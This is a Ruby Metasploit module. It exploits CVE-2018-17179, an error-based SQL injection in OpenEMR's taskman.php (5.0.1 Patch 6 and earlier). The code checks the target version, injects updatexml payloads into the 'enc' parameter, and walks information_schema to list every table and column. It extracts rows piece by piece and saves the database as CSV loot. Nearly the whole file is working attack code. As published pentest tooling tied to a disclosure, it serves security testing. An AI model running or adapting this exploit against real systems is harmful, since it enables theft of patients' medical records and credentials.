# frozen_string_literal: true

require 'csv'
require 'nokogiri'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
                      'Description' => '
                        This module exploits a SQLi vulnerability found in
                        OpenEMR version 5.0.1 Patch 6 and lower. The
                        vulnerability allows the contents of the entire
                        database (with exception of log and task tables) to be
                        extracted.
                        This module saves each table as a `.csv` file in your
                        loot directory and has been tested with
                        OpenEMR 5.0.1 (3).
                      ',
                      'License' => MSF_LICENSE,
                      'Author' =>
                        [
                          'Will Porter <will.porter[at]lodestonesecurity.com>'
                        ],
                      'References' => [
                        ['CVE', '2018-17179'],
                        ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
                      ],
                      'Targets' =>
                        [
                          ['OpenEMR < 5.0.1 (6)', {}]
                        ],
                      'DisclosureDate' => 'May 17 2019',
                      'DefaultTarget' => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the OpenEMR installation', '/openemr'])
      ]
    )
  end

  def uri
    target_uri.path
  end

  def openemr_version
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'admin.php')
    )
    vprint_status("admin.php response code: #{res.code}")
    document = Nokogiri::HTML(res.body)
    document.css('tr')[1].css('td')[3].text
  rescue StandardError
    ''
  end

  def check
    # Check version
    print_status('Trying to detect installed version')
    version = openemr_version
    return Exploit::CheckCode::Unknown if version.empty?

    vprint_status("Version #{version} detected")
    version.sub! ' (', '.'
    version.sub! ')', ''
    version.strip!

    return Exploit::CheckCode::Safe unless Gem::Version.new(version) < Gem::Version.new('5.0.1.7')

    Exploit::CheckCode::Appears
  end

  def get_response(payload)
    path = "#{uri}/interface/forms/eye_mag/taskman.php?"
    # This is only going to work for spaces.  Ideally we could use URI.encode
    # but that is deprecated and CGI.escape uses + which doesn't work
    # for this application.
    path = path.gsub ' ', '%20'
    response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(path),
      'vars_get' => {
        'action' => 'make_task',
        'from_id' => '1',
        'to_id' => '1',
        'pid' => '1',
        'doc_type' => '1',
        'doc_id' => '1',
        'enc' => "1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
      }
    )
    response.body
  end

  def parse_xpath_error(response_body)
    matches = response_body.match %r{XPATH syntax error: '~(.*)'</font.*$}
    return matches[1] if matches
  rescue IndexError
    nil
  end

  def exec_payload_and_parse(payload)
    parse_xpath_error(get_response(payload))
  end

  def complete_where_clause(where_clause, not_in_clause)
    where_clause ||= ''
    if !where_clause.empty? && !not_in_clause.empty?
      where_clause = 'WHERE ' + where_clause + ' AND ' + not_in_clause
    elsif where_clause.empty? && !not_in_clause.empty?
      where_clause = 'WHERE ' + not_in_clause
    elsif !where_clause.empty? && not_in_clause.empty?
      where_clause = 'WHERE ' + where_clause
    end
    where_clause
  end

  def fetch_complete(column_name, table_name, where_condition, not_in_clause)
    offset = 0
    reconstructed_value = ''
    loop do
      where_clause = complete_where_clause(where_condition, not_in_clause)
      payload = "SELECT SUBSTRING(#{column_name}, #{(offset * 31) + 1}) FROM #{table_name} #{where_clause} LIMIT 1"
      value = exec_payload_and_parse(payload)
      reconstructed_value += value unless value.nil?
      break if value.nil? || value.empty? || value.length < 31

      offset += 1
    end
    reconstructed_value
  end

  def enumerate_iteratively(column_name, table_name, where_condition)
    values = []

    loop do
      values_sql_string = "'" + values.join("','") + "'"
      not_in_clause = values.empty? ? '' : "#{column_name} NOT IN (#{values_sql_string})"
      value = fetch_complete(column_name, table_name, where_condition, not_in_clause)
      break if value.nil? || value.empty?

      values.push(value)
    end
    values
  end

  def enumerate_tables
    enumerate_iteratively('table_name',
                          'information_schema.TABLES',
                          '')
  end

  def enumerate_columns(table)
    enumerate_iteratively('column_name',
                          'information_schema.COLUMNS',
                          "table_name = '#{table}'")
  end

  def find_primary_key(table)
    fetch_complete('column_name',
                   'information_schema.KEY_COLUMN_USAGE',
                   "table_name = '#{table}' AND CONSTRAINT_NAME ='PRIMARY'",
                   '')
  end

  def walk_table(table)
    primary_key = find_primary_key(table)
    return if primary_key.nil?

    columns = enumerate_columns(table)
    key_values = enumerate_iteratively(primary_key,
                                       table,
                                       '')

    data = [columns]
    key_values.each do |key_value|
      row = []
      columns.each do |column|
        where_condition = "#{primary_key} = #{key_value}"
        value = fetch_complete(column, table, where_condition, '')
        row.append(value)
      end
      data.append(row)
    end
    data
  end

  def save_csv(data, filename)
    store_loot(
      'openemr.database.dump',
      'application/CSV',
      rhost,
      data,
      filename
    )
  end

  def dump_all
    payload = 'version()'
    db_version = exec_payload_and_parse(payload)
    print_status("DB Version: #{db_version}")
    print_status('Enumerating tables, this may take a moment...')
    tables = enumerate_tables
    num_tables = tables.length
    print_status("Identified #{num_tables} tables.")

    count = 1
    rand_token = rand_text(8)
    dump_dir = File.join(Msf::Config.loot_directory, 'openemr-' + rand_token)
    Dir.mkdir dump_dir
    print_status("Created dump directory: #{dump_dir}")

    # These tables are impossible to fetch because they increase each request
    skiptables = %w[form_taskman log log_comment_encrypt]
    tables.each do |table|
      if skiptables.include?(table)
        print_status("Skipping table (#{count}/#{num_tables}): #{table}")
      else
        print_status("Dumping table (#{count}/#{num_tables}): #{table}")
        table_data = walk_table(table)
        table_data_file_path = File.join(dump_dir, table + '.csv')
        save_csv(table_data, table_data_file_path)
      end

      count += 1
    end
    print_status("Dumped all tables to #{dump_dir}")
  end

  def run
    dump_all
  end
end
